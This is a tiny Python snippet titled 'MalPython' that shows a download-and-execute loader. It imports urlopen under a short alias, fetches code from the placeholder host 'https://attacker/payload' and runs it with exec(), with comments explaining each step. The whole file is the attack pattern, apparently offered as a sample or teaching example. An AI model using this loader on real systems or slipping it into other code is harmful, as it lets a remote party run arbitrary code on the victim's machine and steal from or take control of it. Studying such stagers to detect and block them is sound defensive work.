# MalPython
#
# Download / read python code from remote host and execute it
# assuming no authentication or complex flow

from urllib.request import urlopen as _u 

exec(_u("https://attacker/payload").read())

# urlopen(URL).read() - open the URL and read it
# exec() - treat the bytes as python script and execute it